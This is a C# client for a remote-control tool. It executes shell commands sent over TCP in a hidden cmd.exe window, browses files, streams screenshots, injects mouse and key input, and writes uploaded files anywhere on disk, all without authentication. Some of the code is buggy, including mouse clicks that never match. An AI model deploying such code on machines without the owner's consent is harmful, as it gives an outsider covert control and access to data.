using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.Cryptography;

public static class Handle
{
    private static Dictionary<string, List<(string base64Chunk, string md5)>> fileChunks = new Dictionary<string, List<(string, string)>>();
    private static Dictionary<string, int> fileTotalChunks = new Dictionary<string, int>();
    public static async Task ReceiveMessagesAsync()
    {
        try
        {
            while (true)
            {
                NetworkStream stream = Program.client.client.GetStream();
                byte[] buffer = new byte[32768];
                int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                var packets = receivedData.Split(new string[] { "[A]" }, StringSplitOptions.RemoveEmptyEntries);

                if (packets.Length > 1)
                {
                    Console.WriteLine($"检测到粘包，共[{packets.Length}]个数据包");
                }

                foreach (var packet in packets)
                {
                    var parts = packet.Split("|||");
                    
                    if(packet.Length < 1500) Console.WriteLine($"收到数据: {packet}");
                    else Console.WriteLine($"收到数据长度: {packet.Length} 标头：[{parts[0]}]");
                    if (parts.Length < 2) continue;

                    if (parts[0] == "CMD")
                    {
                        string commandResponse = "BCMD|||" + await Task.Run(() => ExecuteCommand(parts[1]));
                        await Program.client.SendMessageAsync(commandResponse);
                    }
                    if (parts[0] == "FILES")
                    {
                        string filesResponse = "BFILES|||" + await Task.Run(() => GetFileList(parts[1]));
                        await Program.client.SendMessageAsync(filesResponse);
                    }
                    if (parts[0] == "SM")
                    {
                        if (parts[1] == "GET")
                        {
                            string base64Data = await CaptureAndCompressScreenBase64();
                            int chunkSize = 32768;
                            int totalChunks = (base64Data.Length + chunkSize - 1) / chunkSize;

                            for (int i = 0; i < totalChunks; i++)
                            {
                                await Task.Delay(10);
                                int chunkStart = i * chunkSize;
                                int chunkEnd = Math.Min((i + 1) * chunkSize, base64Data.Length);
                                string chunkData = base64Data.Substring(chunkStart, chunkEnd - chunkStart);
                                string dataToSend = $"BSM|||{i + 1}|||{totalChunks}|||{chunkData}";
                                Console.WriteLine($"Sending data chunk {i + 1}/{totalChunks}, size: {chunkData.Length}");
                                await Program.client.SendMessageAsync(dataToSend);
                            }
                            await Task.Delay(20);
                            Console.WriteLine($"Completed sending data. Total chunks: {totalChunks}, size: {base64Data.Length} bytes");
                            await Program.client.SendMessageAsync("BSM|||END");
                        }
                    }
                    if (parts[0] == "CON")
                    {
                        try
                        {
                            if (parts[1] == "MOUSE")
                                ClickMouse(parts[2]);

                            if (parts[1] == "MOUSEMOVE")
                                SetCursorPos(int.Parse(parts[2]), int.Parse(parts[3]));

                            if (parts[1] == "KEY")
                                SimulateKeyPress(int.Parse(parts[2]));
                        }
                        catch { }
                    }
                    if (parts[0] == "UPLOAD")
                    {
                        if (parts.Length == 5)
                        {
                            // 提取分片信息
                            string[] chunkInfo = parts[1].Split('/');
                            int currentChunk = int.Parse(chunkInfo[0]);
                            int totalChunks = int.Parse(chunkInfo[1]);
                            string chunkMd5 = chunkInfo[2];
                            string fileName = parts[2];
                            string folderPath = parts[3];
                            string fileDataBase64Chunk = parts[4];

                            Console.WriteLine($"收到文件数据，[{currentChunk}/{totalChunks}] MD5[{chunkMd5}] Base64[{fileDataBase64Chunk.Length}]");
                            // 构建唯一文件键（使用文件路径+文件名作为键）
                            string fileKey = Path.Combine(folderPath, fileName);

                            // 初始化文件片段缓存
                            if (!fileChunks.ContainsKey(fileKey))
                            {
                                fileChunks[fileKey] = new List<(string, string)>(new (string, string)[totalChunks]);
                                fileTotalChunks[fileKey] = totalChunks;
                            }

                            // 保存当前片段和MD5值到缓存
                            fileChunks[fileKey][currentChunk - 1] = (fileDataBase64Chunk, chunkMd5);

                            // 检查是否接收完所有片段
                            if (fileChunks[fileKey].All(chunk => chunk.Item1 != null))
                            {
                                // 合并所有片段并校验
                                StringBuilder completeBase64Data = new StringBuilder();
                                using (MD5 md5 = MD5.Create())
                                {
                                    foreach (var (chunkBase64, chunkMd5_) in fileChunks[fileKey])
                                    {
                                        completeBase64Data.Append(chunkBase64);
                                        byte[] chunkBytes = Encoding.UTF8.GetBytes(chunkBase64);
                                        byte[] hashBytes = md5.ComputeHash(chunkBytes);
                                        string calculatedMd5 = BitConverter.ToString(hashBytes).Replace("-", "").ToLower();

                                        if (calculatedMd5 != chunkMd5_)
                                        {
                                            Console.WriteLine($"MD5 校验失败，第[{currentChunk}]片");
                                        }
                                    }
                                }
                                try
                                {

                                    // 解码为字节数组
                                    string completeBase64DataString = completeBase64Data.ToString();
                                    byte[] fileData = Convert.FromBase64String(completeBase64DataString);

                                    // 构建完整文件路径并保存文件
                                    string filepath = Path.Combine(folderPath, fileName);
                                    if (!Directory.Exists(folderPath)) Directory.CreateDirectory(folderPath);
                                    await File.WriteAllBytesAsync(filepath, fileData);

                                    // 清理缓存
                                    fileChunks.Remove(fileKey);
                                    fileTotalChunks.Remove(fileKey);

                                    Console.WriteLine("文件已成功接收并保存！");
                                }catch(Exception ex)
                                {
                                    Console.WriteLine(ex.Message);
                                }
                            }
                        }
                    }



                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error receiving messages: " + ex.Message);
        }
    }
    private static string CalculateMD5(string input)
    {
        using (var md5 = System.Security.Cryptography.MD5.Create())
        {
            byte[] inputBytes = Encoding.ASCII.GetBytes(input);
            byte[] hashBytes = md5.ComputeHash(inputBytes);
            return BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
        }
    }
    public static string ExecuteCommand(string command)
    {
        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/C " + command;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.CreateNoWindow = true;
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        process.Close();
        return output;
    }

    public static string GetFileList(string directoryPath)
    {
        try
        {
            DirectoryInfo dirInfo = new DirectoryInfo(directoryPath);
            FileSystemInfo[] fileSystemInfos = dirInfo.GetFileSystemInfos();
            StringBuilder fileList = new StringBuilder();

            foreach (var fileInfo in fileSystemInfos)
            {
                string fileType = fileInfo is DirectoryInfo ? "Dir" : "File";
                string creationTime = fileInfo.CreationTime.ToString("yyyy-MM-dd HH:mm");
                string lastWriteTime = fileInfo.LastWriteTime.ToString("yyyy-MM-dd HH:mm");

                long size = 0 / 1024;
                if (fileInfo is FileInfo file) size = file.Length;

                if (size > 0) fileType = "File";

                fileList.AppendLine($"{fileInfo.Name}|||{fileType}|||{creationTime}|||{lastWriteTime}|||{size}");
            }

            return fileList.ToString();
        }
        catch (Exception ex)
        {
            return ex.Message;
        }
    }



    public static async Task<string> CaptureAndCompressScreenBase64()
    {
        try
        {
            using (var bitmap = new Bitmap(1920, 1080))
            {
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                }
                using (var memoryStream = new MemoryStream())
                {
                    bitmap.Save(memoryStream, ImageFormat.Jpeg);
                    var imageBytes = memoryStream.ToArray();
                    return Convert.ToBase64String(imageBytes);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error capturing screen: " + ex.Message);
            return string.Empty;
        }
    }

    #region 按键操作
    [DllImport("user32.dll")]
    private static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")]
    private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);

    private const uint MOUSEEVENTF_LEFTDOWN = 0x02;
    private const uint MOUSEEVENTF_LEFTUP = 0x04;
    private const uint MOUSEEVENTF_RIGHTDOWN = 0x08;
    private const uint MOUSEEVENTF_RIGHTUP = 0x10;
    private const uint MOUSEEVENTF_MIDDLEDOWN = 0x20;
    private const uint MOUSEEVENTF_MIDDLEUP = 0x40;

    public static void ClickMouse(string mouseChange)
    {
        uint downFlag = 0;
        uint upFlag = 0;

        switch (mouseChange.ToLower())
        {
            case "LeftDOWN":
                downFlag = MOUSEEVENTF_LEFTDOWN;
                break;
            case "LeftUP":
                upFlag = MOUSEEVENTF_LEFTUP;
                break;
            case "RightDOWN":
                downFlag = MOUSEEVENTF_RIGHTDOWN;
                break;
            case "RightUP":
                upFlag = MOUSEEVENTF_RIGHTUP;
                break;
            case "MiddleDOWN":
                downFlag = MOUSEEVENTF_MIDDLEDOWN;
                break;
            case "MiddleUP":
                upFlag = MOUSEEVENTF_MIDDLEUP;
                break;
            default:
                break;
        }

        if (downFlag != 0)
        {
            mouse_event(downFlag, 0, 0, 0, 0);
        }

        if (upFlag != 0)
        {
            mouse_event(upFlag, 0, 0, 0, 0);
        }
    }

    [DllImport("user32.dll", SetLastError = true)]
    private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

    private const uint KEYEVENTF_KEYDOWN = 0x0000;
    private const uint KEYEVENTF_KEYUP = 0x0002;

    public static void SimulateKeyPress(int keyCode)
    {
        byte bVk = (byte)keyCode;
        keybd_event(bVk, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
        keybd_event(bVk, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
    }
    #endregion
}
